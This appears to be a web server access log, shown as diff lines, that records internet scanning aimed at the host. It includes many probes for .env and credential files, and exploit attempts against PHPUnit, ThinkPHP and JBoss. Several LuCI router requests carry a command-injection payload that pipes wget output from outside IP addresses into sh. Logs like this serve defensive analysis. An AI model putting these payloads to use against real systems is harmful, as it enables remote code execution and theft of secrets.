+INFO:     127.0.0.1:34048 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:49764 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36038 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54734 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46348 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60busybox+reboot%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36778 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38206 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38214 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:34546 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49560 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49572 - "GET /?url=.env HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49580 - "GET /API/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49588 - "GET /_static/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49602 - "GET /blogs/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49610 - "GET /client/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47482 - "GET /data/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58810 - "GET /developer/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58824 - "GET /download/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34364 - "GET /html/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55686 - "GET /images/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55702 - "GET /lab/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55712 - "GET /localhost/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41248 - "GET /media/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41254 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50772 - "GET /psnlink/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50784 - "GET /public_html/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37132 - "GET /saas/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46676 - "GET /stag/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47074 - "GET /system/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47076 - "GET /templates/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55144 - "GET /.docker/laravel/app/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33768 - "GET /.gitlab-ci/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39598 - "GET /.vscode/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55186 - "GET /backup/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55202 - "GET /content/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41436 - "GET /cp/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58244 - "GET /doc/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58254 - "GET /docker/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33996 - "GET /exapi/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59456 - "GET /img/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59458 - "GET /inc/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59884 - "GET /includes/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47730 - "GET /actuator/health HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57878 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57886 - "GET /js/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41772 - "GET /layout/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37298 - "GET /locally/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37312 - "GET /log/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37322 - "GET /misc/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37328 - "GET /platform/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37338 - "GET /secrets.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37340 - "GET /settings/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37354 - "GET /static/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37370 - "GET /staticfiles/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37384 - "GET /theme/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50340 - "GET /tmp/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50344 - "GET /upload/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47354 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54558 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39496 - "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43868 - "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43878 - "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54832 - "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36220 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44250 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44258 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:55402 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43790 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35214 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44918 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49814 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51900 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48006 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51658 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51662 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:50522 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:59654 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34360 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43456 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47390 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53030 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52756 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56180 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57028 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53322 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58270 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37722 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48712 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48728 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:48736 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34786 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43872 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43704 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43718 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:58826 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32880 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32882 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60580 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48898 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33404 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56538 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:51342 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47786 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45178 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33780 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47450 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53714 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52838 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52852 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:49048 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59998 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46912 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47666 - "OPTIONS / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:37458 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35906 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50852 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46744 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34214 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34216 - "GET /form.html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34220 - "GET /upl.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34232 - "GET /t4 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35274 - "GET /geoip/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35282 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35290 - "GET /1.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35300 - "GET /systembc/password.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35302 - "GET /password.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60620 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43290 - "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54410 - "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54412 - "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40788 - "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39264 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38996 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38998 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:42068 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47394 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46138 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46142 - "GET /.secrets HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46144 - "GET /static../.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46154 - "GET /prod/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46168 - "GET /staging/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46180 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46188 - "GET /api/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46196 - "GET /backend/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46204 - "GET /dev/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46212 - "GET /core/.env/main/.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46226 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46228 - "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46230 - "GET /static../manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46240 - "GET /manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46250 - "GET /api/manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46262 - "GET /backend/manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46264 - "GET /core/manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46266 - "GET /web/manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46270 - "GET /prod/manage.py HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46300 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53228 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39332 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39340 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:58326 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51228 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50844 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34722 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58748 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53442 - "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48104 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48106 - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48110 - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48112 - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48128 - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48142 - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48146 - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48152 - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48164 - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48166 - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37532 - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37544 - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37546 - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37560 - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37574 - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37578 - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37594 - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37604 - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59970 - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59980 - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59986 - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:59994 - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60000 - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60016 - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60026 - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60034 - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36072 - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36078 - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36082 - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36090 - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36102 - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36112 - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36128 - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36134 - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36148 - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36158 - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36166 - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43810 - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43812 - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43828 - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43840 - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40896 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37054 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36270 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43840 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43696 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35392 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53334 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44442 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44450 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44466 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:44476 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56688 - "GET /ReportServer HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54340 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54348 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54352 - "GET /aab9 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35148 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42790 - "GET /aab9 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46452 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46008 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46016 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:38896 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37590 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38704 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40828 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47102 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47108 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:42452 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59214 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47008 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38268 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59922 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39016 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39030 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:45572 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43856 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43562 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49850 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32980 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50268 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34806 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53036 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53050 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:33324 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49208 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52704 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36396 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58820 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44232 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40604 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49926 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39854 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39870 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:36838 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42514 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45646 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48944 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57254 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48348 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45526 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45534 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:39850 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56530 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53490 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47896 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47900 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38968 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35840 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43868 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40956 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38246 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37982 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53116 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56134 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49298 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49304 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:47610 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47612 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:52444 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54806 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49904 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42770 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42700 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42710 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42718 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42726 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52390 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33912 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58268 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42542 - "GET /.env HTTP/1.1" 404 Not Found
